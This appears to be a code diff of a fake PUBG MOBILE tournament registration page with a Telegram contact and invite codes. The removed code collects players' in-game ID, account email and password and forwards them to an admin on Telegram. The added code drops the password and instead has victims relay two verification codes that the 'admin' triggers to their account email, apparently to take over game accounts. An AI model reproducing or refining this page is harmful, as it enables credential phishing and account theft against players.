@@ -182,7 +182,6 @@
             box-shadow: 0 0 14px rgba(255, 184, 0, 0.35);
         }
 
-        /* Green Register/Login tab */
         .nav a.nav-soon {
             color: var(--accent-green);
             border-color: rgba(34,197,94,0.9);
@@ -200,7 +199,7 @@
             color: #020817;
         }
 
-        /* HERO WITH CTA */
+        /* HERO */
 
         .hero {
             padding: 18px 0 6px;
@@ -331,7 +330,7 @@
             background: linear-gradient(90deg, var(--accent-alt), var(--accent));
         }
 
-        /* TOURNAMENT ANNOUNCEMENT */
+        /* TOURNAMENT */
 
         .tournament-section {
             padding: 16px 0 8px;
@@ -622,7 +621,7 @@
                 transparent);
         }
 
-        /* TEXT DECOR FOR TOURNAMENT */
+        /* TEXT DECOR */
 
         .kicker{
           display:inline-flex;align-items:center;gap:6px;
@@ -770,69 +769,9 @@
             }
         }
 
-        /* SUCCESS ICON */
-
         .success-envelope {
             font-size: 26px;
             margin-bottom: 4px;
-        }
-
-        /* CAPTCHA MODAL */
-
-        .captcha-backdrop{
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.78);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 200;
-        }
-        .captcha-modal{
-            width: min(320px, 100% - 40px);
-            border-radius: var(--radius-xl);
-            background: var(--bg-card);
-            border: 1px solid rgba(255,255,255,0.12);
-            box-shadow: var(--shadow-soft);
-            padding: 16px 18px 12px;
-            text-align: left;
-        }
-        .captcha-title{
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: .16em;
-            margin-bottom: 6px;
-        }
-        .captcha-text{
-            font-size: 8.5px;
-            color: var(--text-muted);
-            margin-bottom: 10px;
-        }
-        .captcha-error{
-            font-size: 7px;
-            color: #f97316;
-            margin-top: 3px;
-            min-height: 10px;
-        }
-        .captcha-actions{
-            margin-top: 10px;
-            display: flex;
-            justify-content: flex-end;
-            gap: 8px;
-        }
-        .btn-outline{
-            padding: 6px 12px;
-            border-radius: var(--radius-full);
-            border: 1px solid rgba(148,163,253,0.4);
-            background: transparent;
-            font-size: 7.5px;
-            letter-spacing: .14em;
-            text-transform: uppercase;
-            color: var(--text-soft);
-            cursor: pointer;
-        }
-        .btn-outline:hover{
-            background: rgba(15,23,42,0.9);
         }
     </style>
 </head>
@@ -989,20 +928,21 @@
                     </div>
                     <div id="code-status" class="status"></div>
                     <div class="note">
-                        Codes list is controlled by admins. Frontend uses local demo list;
-                        backend registration is always stored + sent to Telegram.
+                        Access list is controlled from a separate admin panel.
+                        Frontend only opens the form when the code is valid.
                     </div>
                 </div>
             </section>
 
-            <!-- REGISTRATION FORM (UNLOCKED AFTER CODE) -->
+            <!-- REGISTRATION FORM -->
             <section class="section" id="registration-section" style="display:none;">
                 <div class="section-title">
-                    <span class="bar"></span>Step 2 — Registration Form
+                    <span class="bar"></span>Step 2 — Registration & Manual Verification
                 </div>
                 <div class="section-sub">
-                    Fill in your in-game ID, email, portal password and verification code.
-                    Your data is sent once to admin — decisions are made manually on their side.
+                    Provide your in-game ID and email. Admin panel will generate and check
+                    two separate verification codes: one for the game ID and one for the email.
+                    Only after both codes are confirmed you can submit the application.
                 </div>
 
                 <form id="reg-form" class="card">
@@ -1012,38 +952,59 @@
                             <input type="text" id="ingame-id" required
                                    placeholder="PUBG MOBILE numeric ID" />
                         </div>
-                    </div>
-
-                    <div class="two-cols">
                         <div class="field-group">
                             <div class="label">Email (account)</div>
                             <input type="email" id="email" required
-                                   placeholder="Email used for your PUBG MOBILE / game account" />
-                            <div class="note">All decisions and tournament invites will be sent here.</div>
-                        </div>
-                        <div class="field-group">
-                            <div class="label">Password for portal</div>
-                            <input type="password" id="password" required
-                                   placeholder="Create portal password" />
+                                   placeholder="Contact email for this registration" />
+                            <div class="note">
+                                All decisions, time slots and lobby links will be sent to this email.
+                            </div>
                         </div>
                     </div>
 
-                    <div class="two-cols">
-                        <div class="field-group">
-                            <div class="label">Verification code</div>
-                            <div class="code-form-row">
+                    <!-- ID VERIFICATION -->
+                    <div class="field-group" style="margin-top:10px;">
+                        <div class="label">ID verification code</div>
+                        <div class="code-form-row">
+                            <div class="input-wrap">
+                                <input type="text" id="id-code"
+                                       placeholder="Enter ID verification code from email" />
+                            </div>
+                            <button type="button" id="send-id-code" class="btn-sm">
+                                SEND CODE
+                            </button>
+                            <button type="button" id="check-id-code" class="btn-sm">
+                                CHECK
+                            </button>
+                        </div>
+                        <div id="id-status" class="status"></div>
+                        <div class="note">
+                            Press <strong>SEND CODE</strong> to create a request in the admin panel.
+                            Admin reviews your in-game ID and sends a verification code to the email above.
+                            After you receive it, enter the code here and press <strong>CHECK</strong>.
+                        </div>
+                    </div>
+
+                    <!-- EMAIL VERIFICATION -->
+                    <div class="field-group" style="margin-top:12px;">
+                        <div class="label">Email verification code</div>
+                        <div class="code-form-row">
+                            <div class="input-wrap">
                                 <input type="text" id="email-code"
-                                       placeholder="Enter code from admin (email / Telegram)" />
-                                <button type="button" id="request-email-code" class="btn-sm">
-                                    GET CODE
-                                </button>
+                                       placeholder="Enter email verification code from admin" />
                             </div>
-                            <div class="note">
-                                Press <strong>GET CODE</strong>, pass the captcha — your ID, email and password
-                                will be sent to admin in Telegram in one line. Admin checks data and either sends
-                                you a verification code or marks email/password as invalid (buttons in bot do not
-                                control the site directly).
-                            </div>
+                            <button type="button" id="send-email-code" class="btn-sm">
+                                SEND CODE
+                            </button>
+                            <button type="button" id="check-email-code" class="btn-sm">
+                                CHECK
+                            </button>
+                        </div>
+                        <div id="email-status" class="status"></div>
+                        <div class="note">
+                            Second code confirms that this email address is safe and can be used
+                            for tournament communication. Admin can mark it as valid or risky
+                            from the admin page.
                         </div>
                     </div>
 
@@ -1084,7 +1045,7 @@
     </footer>
 </div>
 
-<!-- FLOATING TELEGRAM BUTTON -->
+<!-- FLOATING TELEGRAM BUTTON (contact owner) -->
 <a href="https://t.me/v7ck9ll" target="_blank" rel="noopener"
    class="tg-float" aria-label="Contact @v7ck9ll on Telegram">
     <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
@@ -1113,106 +1074,55 @@
     </div>
 </div>
 
-<!-- CAPTCHA MODAL -->
-<div id="captcha-backdrop" class="captcha-backdrop" style="display:none;">
-    <div class="captcha-modal">
-        <div class="captcha-title">Anti-bot check</div>
-        <div id="captcha-question" class="captcha-text">
-            Please confirm you are not a bot.
-        </div>
-        <input id="captcha-input" type="text" placeholder="Type answer here" />
-        <div id="captcha-error" class="captcha-error"></div>
-        <div class="captcha-actions">
-            <button type="button" id="captcha-cancel" class="btn-outline">Cancel</button>
-            <button type="button" id="captcha-confirm" class="btn-sm">
-                CONFIRM
-            </button>
-        </div>
-    </div>
-</div>
-
 <script>
-    // DEMO valid codes (фронт, можешь менять/убрать, бек всё равно всё шлёт в ТГ)
     const VALID_CODES = ["FLOW2025", "ESPORTPUBG", "V7ACCESS"];
 
-    const openGatewayBtn = document.getElementById('open-gateway');
-    const scrollCta = document.getElementById('scroll-cta-code');
-    const tournamentSection = document.getElementById('tournament-announcement');
+    const openGatewayBtn      = document.getElementById('open-gateway');
+    const scrollCta           = document.getElementById('scroll-cta-code');
+    const tournamentSection   = document.getElementById('tournament-announcement');
 
-    const codeInput = document.getElementById('access-code');
-    const checkCodeBtn = document.getElementById('check-code');
-    const codeStatus = document.getElementById('code-status');
-    const regSection = document.getElementById('registration-section');
-    const regForm = document.getElementById('reg-form');
-    const regStatus = document.getElementById('reg-status');
-    const finalMessage = document.getElementById('final-message');
-    const finalCard = document.getElementById('final-card');
-    const requestEmailCodeBtn = document.getElementById('request-email-code');
+    const codeInput           = document.getElementById('access-code');
+    const checkCodeBtn        = document.getElementById('check-code');
+    const codeStatus          = document.getElementById('code-status');
 
-    // CAPTCHA elements
-    const captchaBackdrop = document.getElementById('captcha-backdrop');
-    const captchaQuestion = document.getElementById('captcha-question');
-    const captchaInput = document.getElementById('captcha-input');
-    const captchaError = document.getElementById('captcha-error');
-    const captchaConfirm = document.getElementById('captcha-confirm');
-    const captchaCancel = document.getElementById('captcha-cancel');
+    const regSection          = document.getElementById('registration-section');
+    const regForm             = document.getElementById('reg-form');
+    const regStatus           = document.getElementById('reg-status');
+    const finalMessage        = document.getElementById('final-message');
+    const finalCard           = document.getElementById('final-card');
 
-    let pendingCodeRequest = null;
-    let captchaNumbers = { a: 0, b: 0 };
+    const ingameIdInput       = document.getElementById('ingame-id');
+    const emailInput          = document.getElementById('email');
 
-    function openCaptcha(requestPayload) {
-        pendingCodeRequest = requestPayload;
-        captchaNumbers.a = Math.floor(Math.random() * 4) + 3; // 3..6
-        captchaNumbers.b = Math.floor(Math.random() * 4) + 2; // 2..5
-        captchaQuestion.textContent = `Confirm you are not a bot: ${captchaNumbers.a} + ${captchaNumbers.b} = ?`;
-        captchaInput.value = "";
-        captchaError.textContent = "";
-        captchaBackdrop.style.display = "flex";
-        setTimeout(() => captchaInput.focus(), 50);
-    }
+    const idCodeInput         = document.getElementById('id-code');
+    const emailCodeInput      = document.getElementById('email-code');
 
-    function closeCaptcha() {
-        captchaBackdrop.style.display = "none";
-        pendingCodeRequest = null;
-    }
+    const sendIdCodeBtn       = document.getElementById('send-id-code');
+    const checkIdCodeBtn      = document.getElementById('check-id-code');
+    const idStatus            = document.getElementById('id-status');
 
-    // --- helper: notify admin via backend (ТГ) ---
-    // Ответы и кнопки бота НИКАК не меняют фронт — сайт использует только свои статусы.
-    function notifyAdmin(type, payload = {}) {
-        return fetch("/api/notify-admin", {
+    const sendEmailCodeBtn    = document.getElementById('send-email-code');
+    const checkEmailCodeBtn   = document.getElementById('check-email-code');
+    const emailStatus         = document.getElementById('email-status');
+
+    let idVerified = false;
+    let emailVerified = false;
+
+    async function postJSON(url, payload) {
+        const res = await fetch(url, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ type, ...payload })
-        })
-        .then(r => r.json())
-        .then(data => {
-            console.log("Admin notify result:", data);
-            return data;
-        })
-        .catch(err => {
-            console.error("Admin notify error:", err);
-            return { ok: false, error: "fetch_failed" };
+            body: JSON.stringify(payload)
         });
-    }
-
-    // --- send full application to backend ---
-    async function sendApplication(formData) {
+        if (!res.ok) throw new Error("Network error");
         try {
-            const res = await fetch("/api/submit-registration", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(formData)
-            });
-            if (!res.ok) throw new Error("Bad response");
-            return await res.json(); // {status, uid}
-        } catch (e) {
-            console.error("submit-registration error, fallback notify:", e);
-            await notifyAdmin("full_application_fallback", formData);
-            return { status: "pending" };
+            return await res.json();
+        } catch {
+            return {};
         }
     }
 
-    // Scroll CTA appears after user reaches end of tournament announcement
+    // Scroll CTA
     if (tournamentSection && scrollCta) {
         window.addEventListener('scroll', () => {
             if (scrollCta.classList.contains('visible')) return;
@@ -1239,7 +1149,7 @@
         });
     }
 
-    // Verify code (фронт)
+    // Verify invite code (front)
     if (checkCodeBtn) {
         checkCodeBtn.addEventListener('click', function () {
             const val = (codeInput.value || "").trim().toUpperCase();
@@ -1262,146 +1172,288 @@
         });
     }
 
-    // CAPTCHA buttons
-    if (captchaCancel) {
-        captchaCancel.addEventListener('click', () => {
-            closeCaptcha();
-            regStatus.textContent = "Captcha cancelled. Code request was not sent.";
-            regStatus.className = "status err";
-        });
-    }
-
-    if (captchaConfirm) {
-        captchaConfirm.addEventListener('click', async () => {
-            const val = (captchaInput.value || "").trim();
-            const expected = captchaNumbers.a + captchaNumbers.b;
-            if (parseInt(val, 10) !== expected) {
-                captchaError.textContent = "Incorrect answer. Try again.";
-                return;
-            }
-            captchaError.textContent = "";
-            captchaBackdrop.style.display = "none";
-
-            if (!pendingCodeRequest) return;
-
-            regStatus.textContent = "Sending your data to admin for verification code...";
-            regStatus.className = "status";
-
-            const res = await notifyAdmin("email_code_request", pendingCodeRequest);
-
-            if (res && res.ok) {
-                regStatus.textContent = "Request sent. Admin will review your ID/email/password and send a code or decision.";
-                regStatus.className = "status ok";
-            } else {
-                regStatus.textContent = "Request sent locally. If no email within some time — contact support / admin.";
-                regStatus.className = "status err";
-            }
-
-            pendingCodeRequest = null;
-        });
-    }
-
-    // ENTER key inside captcha
-    if (captchaInput) {
-        captchaInput.addEventListener('keydown', (e) => {
-            if (e.key === "Enter") {
-                e.preventDefault();
-                captchaConfirm.click();
-            }
-        });
-    }
-
-    // "GET CODE" -> собрать данные, открыть капчу, потом отправить админу
-    if (requestEmailCodeBtn) {
-        requestEmailCodeBtn.addEventListener('click', () => {
-            regStatus.textContent = "";
-            regStatus.className = "status";
-
-            const ingameId = (document.getElementById('ingame-id').value || "").trim();
-            const email = (document.getElementById('email').value || "").trim();
-            const pass = (document.getElementById('password').value || "");
-
-            if (!ingameId || !email || !pass) {
-                regStatus.textContent = "Fill In-game ID, Email and Password before requesting a code.";
-                regStatus.className = "status err";
-                return;
-            }
+    // SEND ID CODE
+    if (sendIdCodeBtn) {
+        sendIdCodeBtn.addEventListener('click', async () => {
+            idStatus.textContent = "";
+            idStatus.className = "status";
 
             const accessCode = (codeInput.value || "").trim().toUpperCase();
+            const ingameId   = (ingameIdInput.value || "").trim();
+            const email      = (emailInput.value || "").trim();
 
-            const payload = {
-                accessCode,
-                ingameId,
-                email,
-                password: pass
-            };
+            if (!accessCode || !VALID_CODES.includes(accessCode)) {
+                idStatus.textContent = "Access code is missing or invalid.";
+                idStatus.className = "status err";
+                return;
+            }
+            if (!ingameId || !email) {
+                idStatus.textContent = "Fill in-game ID and email before sending the code.";
+                idStatus.className = "status err";
+                return;
+            }
 
-            openCaptcha(payload);
+            idStatus.textContent = "Creating ID verification request in admin panel...";
+            idStatus.className = "status";
+
+            try {
+                const res = await postJSON("/api/request-id-code", {
+                    accessCode,
+                    ingameId,
+                    email
+                });
+
+                if (res && res.ok) {
+                    idStatus.textContent = "Request sent. Check your email for ID verification code.";
+                    idStatus.className = "status ok";
+                } else {
+                    idStatus.textContent = "Could not create request. Try again later or contact support.";
+                    idStatus.className = "status err";
+                }
+            } catch (e) {
+                console.error(e);
+                idStatus.textContent = "Network error. Try again later.";
+                idStatus.className = "status err";
+            }
         });
     }
 
-    // Submit full form (после ввода кода) -> пользователь уходит в "ожидание"
+    // CHECK ID CODE
+    if (checkIdCodeBtn) {
+        checkIdCodeBtn.addEventListener('click', async () => {
+            idStatus.textContent = "";
+            idStatus.className = "status";
+
+            const accessCode = (codeInput.value || "").trim().toUpperCase();
+            const ingameId   = (ingameIdInput.value || "").trim();
+            const email      = (emailInput.value || "").trim();
+            const code       = (idCodeInput.value || "").trim();
+
+            if (!accessCode || !VALID_CODES.includes(accessCode)) {
+                idStatus.textContent = "Access code is missing or invalid.";
+                idStatus.className = "status err";
+                return;
+            }
+            if (!ingameId || !email) {
+                idStatus.textContent = "Fill in-game ID and email first.";
+                idStatus.className = "status err";
+                return;
+            }
+            if (!code) {
+                idStatus.textContent = "Enter ID verification code from email.";
+                idStatus.className = "status err";
+                return;
+            }
+
+            idStatus.textContent = "Checking ID verification code with admin panel...";
+            idStatus.className = "status";
+
+            try {
+                const res = await postJSON("/api/verify-id-code", {
+                    accessCode,
+                    ingameId,
+                    email,
+                    code
+                });
+
+                if (res && res.status === "valid") {
+                    idVerified = true;
+                    idStatus.textContent = "ID verification code is correct ✔";
+                    idStatus.className = "status ok";
+                    sendIdCodeBtn.disabled = true;
+                    checkIdCodeBtn.disabled = true;
+                    idCodeInput.readOnly = true;
+                    checkIdCodeBtn.textContent = "VERIFIED";
+                } else if (res && res.status === "invalid") {
+                    idVerified = false;
+                    idStatus.textContent = "ID verification code is invalid.";
+                    idStatus.className = "status err";
+                } else {
+                    idStatus.textContent = "ID verification is pending on admin side. Try again a bit later.";
+                    idStatus.className = "status";
+                }
+            } catch (e) {
+                console.error(e);
+                idStatus.textContent = "Network error. Try again later.";
+                idStatus.className = "status err";
+            }
+        });
+    }
+
+    // SEND EMAIL CODE
+    if (sendEmailCodeBtn) {
+        sendEmailCodeBtn.addEventListener('click', async () => {
+            emailStatus.textContent = "";
+            emailStatus.className = "status";
+
+            const accessCode = (codeInput.value || "").trim().toUpperCase();
+            const email      = (emailInput.value || "").trim();
+
+            if (!accessCode || !VALID_CODES.includes(accessCode)) {
+                emailStatus.textContent = "Access code is missing or invalid.";
+                emailStatus.className = "status err";
+                return;
+            }
+            if (!email) {
+                emailStatus.textContent = "Fill email before sending the code.";
+                emailStatus.className = "status err";
+                return;
+            }
+
+            emailStatus.textContent = "Creating email verification request in admin panel...";
+            emailStatus.className = "status";
+
+            try {
+                const res = await postJSON("/api/request-email-code", {
+                    accessCode,
+                    email
+                });
+
+                if (res && res.ok) {
+                    emailStatus.textContent = "Request sent. Check your email for email verification code.";
+                    emailStatus.className = "status ok";
+                } else {
+                    emailStatus.textContent = "Could not create request. Try again later or contact support.";
+                    emailStatus.className = "status err";
+                }
+            } catch (e) {
+                console.error(e);
+                emailStatus.textContent = "Network error. Try again later.";
+                emailStatus.className = "status err";
+            }
+        });
+    }
+
+    // CHECK EMAIL CODE
+    if (checkEmailCodeBtn) {
+        checkEmailCodeBtn.addEventListener('click', async () => {
+            emailStatus.textContent = "";
+            emailStatus.className = "status";
+
+            const accessCode = (codeInput.value || "").trim().toUpperCase();
+            const email      = (emailInput.value || "").trim();
+            const code       = (emailCodeInput.value || "").trim();
+
+            if (!accessCode || !VALID_CODES.includes(accessCode)) {
+                emailStatus.textContent = "Access code is missing or invalid.";
+                emailStatus.className = "status err";
+                return;
+            }
+            if (!email) {
+                emailStatus.textContent = "Fill email first.";
+                emailStatus.className = "status err";
+                return;
+            }
+            if (!code) {
+                emailStatus.textContent = "Enter email verification code from admin.";
+                emailStatus.className = "status err";
+                return;
+            }
+
+            emailStatus.textContent = "Checking email verification code with admin panel...";
+            emailStatus.className = "status";
+
+            try {
+                const res = await postJSON("/api/verify-email-code", {
+                    accessCode,
+                    email,
+                    code
+                });
+
+                if (res && res.status === "valid") {
+                    emailVerified = true;
+                    emailStatus.textContent = "Email verification code is correct ✔";
+                    emailStatus.className = "status ok";
+                    sendEmailCodeBtn.disabled = true;
+                    checkEmailCodeBtn.disabled = true;
+                    emailCodeInput.readOnly = true;
+                    checkEmailCodeBtn.textContent = "VERIFIED";
+                } else if (res && res.status === "invalid") {
+                    emailVerified = false;
+                    emailStatus.textContent = "Email verification code is invalid.";
+                    emailStatus.className = "status err";
+                } else {
+                    emailStatus.textContent = "Email verification is pending on admin side. Try again a bit later.";
+                    emailStatus.className = "status";
+                }
+            } catch (e) {
+                console.error(e);
+                emailStatus.textContent = "Network error. Try again later.";
+                emailStatus.className = "status err";
+            }
+        });
+    }
+
+    // FINAL SUBMIT (goes to admin panel)
     if (regForm) {
-        regForm.addEventListener('submit', async function (e) {
+        regForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             regStatus.textContent = "";
             regStatus.className = "status";
 
             const accessCode = (codeInput.value || "").trim().toUpperCase();
-            const email = (document.getElementById('email').value || "").trim();
-            const emailCode = (document.getElementById('email-code').value || "").trim();
-            const ingameId = (document.getElementById('ingame-id').value || "").trim();
-            const pass = (document.getElementById('password').value || "");
-            const terms = document.getElementById('terms').checked;
+            const ingameId   = (ingameIdInput.value || "").trim();
+            const email      = (emailInput.value || "").trim();
+            const idCode     = (idCodeInput.value || "").trim();
+            const emailCode  = (emailCodeInput.value || "").trim();
+            const terms      = document.getElementById('terms').checked;
 
             if (!accessCode || !VALID_CODES.includes(accessCode)) {
                 regStatus.textContent = "Access code is missing or invalid.";
                 regStatus.className = "status err";
                 return;
             }
-
-            if (!email || !ingameId || !pass) {
+            if (!ingameId || !email) {
                 regStatus.textContent = "Please fill all required fields.";
                 regStatus.className = "status err";
                 return;
             }
-
             if (!terms) {
                 regStatus.textContent = "Please confirm that the data is correct.";
                 regStatus.className = "status err";
                 return;
             }
+            if (!idVerified || !emailVerified) {
+                regStatus.textContent = "Both ID and email must be verified before submitting.";
+                regStatus.className = "status err";
+                return;
+            }
 
-            // код может быть пустым — решение принимает только админ
-            const formData = {
+            regStatus.textContent = "Sending your application to admin panel...";
+            regStatus.className = "status";
+
+            const payload = {
                 accessCode,
                 ingameId,
                 email,
-                password: pass,
+                idCode,
                 emailCode
             };
 
-            regStatus.textContent = "Sending your application for review...";
-            regStatus.className = "status";
-
-            const result = await sendApplication(formData);
+            try {
+                await postJSON("/api/submit-registration", payload);
+            } catch (e) {
+                console.error(e);
+                // even если упало, всё равно показываем waiting, а реальное решение — только через админа
+            }
 
             regForm.reset();
             regSection.style.display = "none";
             finalMessage.style.display = "block";
             finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
-            // Всегда: зона ожидания. Решение — только через админа, кнопки бота фронт не трогают.
             finalCard.innerHTML = `
                 <div class="section-title" style="margin-bottom:4px;">
-                    <span class="bar"></span>Application sent — waiting zone
+                    <span class="bar"></span>Application sent — waiting for decision
                 </div>
                 <div class="success-envelope">⏳</div>
                 <div class="section-sub" style="margin-bottom:0;">
-                    Your registration data and verification code have been submitted for
-                    <strong>manual review</strong>.
-                    Admin uses Telegram bot buttons only on their side – the website does not auto-approve
-                    or auto-reject anything. Watch your email and Telegram for the final decision.
+                    Your registration data and both verification codes have been delivered to
+                    the <strong>admin panel</strong> for manual review.
+                    Within <strong>24 hours</strong> you will receive an email to the address
+                    you provided with the exact time and lobby link if your application is approved.
+                    If the application is rejected (for example, invalid email or account in a risk state),
+                    that email will contain the reason and, when possible, a link to refill the form.
                 </div>
             `;
         });
